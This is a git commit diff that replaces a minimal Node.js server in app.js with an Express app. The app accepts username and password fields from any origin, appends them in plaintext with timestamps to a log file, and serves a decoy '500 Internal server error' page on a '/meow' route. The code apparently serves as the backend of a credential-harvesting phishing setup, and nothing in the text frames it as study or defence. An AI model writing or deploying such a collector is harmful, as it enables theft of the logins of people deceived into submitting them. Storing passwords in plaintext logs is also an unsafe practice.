00e21b6e1b0ac3b6a44427ab7db2c3c4873a90c7
abdooufi <abdooufi1@gmail.com>
2025-07-31 11:03:46 +0400

    fix 22

--- app.js
+++ app.js
@@ -1,10 +1,39 @@
-const http = require('http');
+ 
 
-const server = http.createServer((req, res) => {
-  res.writeHead(200, { 'Content-Type': 'text/plain' });
-  res.end('Welcome to Node.js!\n');
+const express = require('express');
+const fs = require('fs');
+const cors = require('cors');
+const { timeStamp } = require('console');
+
+const app = express();
+const PORT = 3333;
+
+app.use(cors());
+app.use(express.json()); // or express.json() for JSON input
+
+app.post('/', (req, res) => {
+  
+  const {username, password} = req.body
+  
+  const logEntry = `[${new Date().toISOString()}] Username: ${username}, Password: ${password}\n`;
+
+  fs.appendFile('requests.log', logEntry, (err) => {
+    if (err) {
+      console.error('Log write error:', err);
+      return res.status(500).send('Error logging data');
+    }
+
+    console.log('Logged:', logEntry.trim());
+    
+    res.send(200)
+  });
+  
 });
 
-server.listen(3000, () => {
-  console.log('Server running at http://localhost:3000/');
+app.get('/meow',(req, res)=>{
+  res.send("<h1>500</h1><h3>Internal server error</h3>")
+})
+
+app.listen(PORT, () => {
+  
 });
